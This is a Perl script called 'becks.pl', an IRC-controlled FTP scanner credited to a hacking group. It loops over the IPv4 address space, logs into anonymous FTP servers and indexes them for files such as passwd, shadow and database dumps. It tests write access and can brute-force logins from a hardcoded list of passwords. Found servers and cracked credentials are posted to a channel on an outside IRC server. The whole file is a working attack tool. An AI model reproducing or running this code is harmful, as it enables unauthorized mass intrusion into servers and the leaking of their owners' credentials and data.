#!/usr/bin/perl
#
# Hollow Chocolate Bunnies From Hell
#            presenting
# becks.pl - FTP scanner by softxor
# Version 0.9
#
#
# becks.pl is an IRC bot that scans for anonymous FTP servers or FTP's witth easy to break
# password protection and posts the contents (if anonymous login) or the login data to a specific Channel
#
# usage: ./ftp_scan 132.311.0.0
#
# Greets fly out to: rembrandt, kamooo, evil, zera, litestar, #milw0rm
#
# Contact:
# - WWW:  http://bunnies.rootyourbox.org/
# - MAIL: insertnamehere at gmx dot de
# - IRC:  #hcbfh @ irc.milw0rm.com
#
# NOTE: This bot has been written just for fun. If you can't get it running, it's better that way.
#
# Yet to come:
# extern pass/userfile

use strict;
use warnings;
use Net::FTP;

#################################
#     Global Configuration      #
#################################
my %config = (max_childs => 40, # Maximal parallel process (recomended up to 100)
              logging    => 1,     # If 1, then enable logging 
              use_brute_force => 0, # If 0, then scans only for anonymous ftps
              indexing   => 1,    # If 1, creates for every accessed ftp a file with the contents of that ftpd
              anon_email => 'bleh@blah.co.uk', # Email Address to use in anonymous checking
              timeout    => 1,    # Connection timeout in seconds
              passfile   => '',     # Missing/not implemented in this version
              userfile   => '');    # Missing/not implemented in this version

#################################
#          IRC settings         #
#################################
my %irc = (enabled  => 1,         # 1 for enable IRC bot
           server   => 'irc.milw0rm.com', 
           port     => 6667,
           nickname => 'ftpbot',    
           username => 'ftpbot ftpbot ftbot ftpbot', # Yes it has to be four times
           channel  => '#hcbfh',
           nickserv => ''); # Nickserv password

#################################
# Data for brute forcing attack #
#################################
my @usernames = qw(Administrator upload admin web webmaster user root ftp);

my @passwords = qw(password qwertz asdf test test123 1234 1111 12 345678 4321 12345678 123456 secret letmein upload pass support passwort god love 007 admin knight wizard letmein test administrator root web webmaster ftp);


# Global declarations
my $childs = 0;


# Mirc colors
my %colors = (white => "\x030",
              red   => "\x034",
              green => "\x033",
              gray  => "\x0314",
              yellow=> "\x038",
              blue  => "\x0312",
              cyan  => "\x0311",
              orange=> "\x0307");


# Parse teh argument!
my($ipa, $ipb, $ipc, $ipd) = ($ARGV[0] =~ m/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/) or die("Append start IP.\n");


&main();
exit();


sub main {

  # Start IRC notifying process
  if ($irc{'enabled'} == 1) {
    pipe(IN, OUT) || die "Can't create pipe....\n";
    
    OUT->autoflush(1);
    IN->autoflush(1);
    
    if (!fork) {
      &irc_notify();
    } else {
      close IN;
    }
   
    sleep(30); # needed to let the IRC process join the channel 
  }
  
  close IN;
  
  
  print "Start scanning...\nBe patient.\n";
  
  my $OUTPUT_AUTOFLUSH = 1; # To avoid buffering problems with fork()
  
  # loop through IPs
  while (1) {
    for my $a ($ipa..255) {
      
      if ($a == 10 || $a == 198 || $a == 127 || $a == 0 || $a == 172 || $a == 1) {
        next;
      }
      
      for my $b ($ipb..255) {  
        for my $c ($ipc..255) {
          for my $d ($ipd..255) {

            if (fork() == 0) {
              #print "$a.$b.$c.$d\n"; # Uncomment for verbose output
              &scan("$a.$b.$c.$d");
              exit;
            } else {
              $childs++;
              if ($childs >= $config{'max_childs'}) {
                wait();
                $childs--;
              }
            }
            
          } # end $d
        } # end $c
      } # end $b
    } #end $a
  
  } # end while
  
} #end main()


# gets the content of a dir by recursion
sub get_dir {

  my ($cur_dir, $ftp) = @_;
  my ($content, @found_files, $write, @dirs);
  $content = ''; # needed
  my %data_types = (mpg => 'Video',
                    avi => 'Video',
                    xvid=> 'DivX',
                    divx=> 'DivX',
                    mp3 => 'Music',
                    ogg => 'Music',
                    sql => 'MySQL',
                    xxx => 'Pr0n',
                    pdf => 'Pdf',
                    jpg => 'Pictures',
                    gif => 'Pictures',
                    zip => 'Zip',
                    ace => 'Ace',
                    rar => 'Rar',
                    exe => 'Exe',
                    txt => 'Txt',
                    passwd => 'passwd',
                    shadow => 'shadow',
                    htm => 'HTML',
                    mdb => 'AccessDB',
                    bak => 'Backup',
                    xls => 'Excel Sheet');
                    
  $ftp->cwd($cur_dir);
  my @files = $ftp->dir;
  
  if ($cur_dir eq '/') {
    $write = &test_write($ftp);
  }

  # $_ isnt working here, because of validity conflicts :(
  foreach my $file (@files) {
  
    if ($file eq '.' || $file eq '..') {
      next;
    }

    
    if ($file =~ m/^d[rwx-].*\d\s(.*?)$/) {
      push (@dirs, $1);
    } else {
    
      # find interesting content
      foreach my $type (keys %data_types) {
        if ($file =~ m/$type$/gi) {
          push (@found_files, $data_types{$type});
        }
      }  
      
    }
    
  } # end for each
  
  
  while(my $cur = pop(@dirs)) {
    if ($cur_dir eq '/') {
      $content .= &get_dir('/'.$cur, $ftp);
    } else {
      $content .= &get_dir($cur_dir.'/'.$cur, $ftp);
    }
  }
  

  @found_files = &del_double(@found_files);
  
  foreach my $files (@found_files) {
    $content .= $files.' ';
  }
  
  
  if ($write) {
      $content .= "$colors{'red'}Write-Enabled";
  }  
  
  return $content;
  
}



sub scan {

  my ($host) = @_;

  my $ftp = Net::FTP->new($host,Timeout=>$config{'timeout'}) or return;
  
  
  # grab banner
  my $banner = $ftp->message;
  $banner =~ s/\n/ /g;
  
  
  # Anonymous checker
  if ($ftp->login('anonymous', $config{'anon_email'})) {
  
    if ($config{'logging'}) {
      open(LOG, ">anonymous.log");
    } else {
      open(LOG, '>-');
    }
    
    
    
    if ($config{'indexing'}) {
      my $content = &get_dir("/", $ftp);

      if($irc{'enabled'}) {
      
        if ($content ne '') {
          print OUT "$colors{'white'}Anonymous FTP: $colors{'orange'}ftp://$host/ $colors{'white'}Content: $colors{'yellow'}$content$colors{'white'}Banner: $colors{'orange'}$banner\n";
        } else {
          print OUT "$colors{'white'}Anonymous FTP: $colors{'orange'}ftp://$host/ $colors{'white'}Banner: $colors{'orange'}$banner\n";
        }        

      } #end irc
      
      print LOG "ftp://$host/ Content: $content Banner: $banner\n"
      
    } else {
    
      if($irc{'enabled'}) {
        print OUT "$colors{'white'}Anonymous FTP: ftp://$host/ Banner: $colors{'orange'}$banner\n";
      }
      
      print LOG "ftp://$host/ Banner: $banner\n"
      
    }
    
    close(LOG);

    $ftp->quit;
    
    return;
  } # end anonymous
  
  
  
  # if you're not willing, you'll never grow old!
  if ($config{'use_brute_force'}) {
    
    foreach my $user (@usernames) {
      foreach my $pass (@passwords) {
        if($ftp->login($user, $pass)) {
          
          if ($config{'logging'}) {
            open(LOG, ">protected.log");
          } else {
            open(LOG, '>-');
          }
          
          
          if($irc{'enabled'}) {
            print OUT "$colors{'red'}ftp://$user:$pass\@$host/ $colors{'white'}banner: $colors{'orange'}$banner\n";
          }

          print LOG "ftp://$user:$pass\@$host/\n";
          close(LOG);
        
          $ftp->quit;
          
          return;
          
        } else {
          next;
        }
      }
    }
  } # end brute force
  

  return;
}



# paste incoming ftps on the irc channel
sub irc_notify {

  print "Staring IRC client\n";
  
  close OUT;
  
  my $con = IO::Socket::INET->new(PeerAddr=>$irc{'server'},
                             PeerPort=>$irc{'port'},
                             Proto=>'tcp',
                             Timeout=>'30') or die("Error: IRC handler cannot connect\n");

  if(fork) {
    # waiting for new ftps, to give them out
    while (my $answer = <$con>) {

      if($answer =~ m/^PING \:(.*?)$/gi) {
        print $con "PONG :".$1."\n";
      }
      
    }
    
  }
  
  print $con "USER $irc{'username'}\r\n";
  print $con "NICK $irc{'nickname'}\r\n";
  
  sleep(5);
  print $con "JOIN $irc{'channel'}\r\n";
  print "IRC client is running.\n";
  
  if ($irc{'nickserv'}) {
    print $con "privmsg nickserv IDENTIFY $irc{'nickserv'}\r\n";
  }
  
  
  # make sure we dont ping out
  while (my $ftp = <IN>) {
    print $con "privmsg $irc{'channel'} :$ftp\r\n";
  }
  
  close $con;
}



# test if ftp is write enabled
# return 1 if writing is allowed,
# 0 if permitted
sub test_write {
  my $ftp = $_[0];
  
  if ($ftp->mkdir("test")) {
    $ftp->rmdir("test"); # we want to be 'polite' ;)
    return 1;
  }
  
  return 0;
}



# deletes double entries in an array
sub del_double {
  my %all;
  
  grep { $all {$_} = 0} @_;
  
  return (keys %all);
}

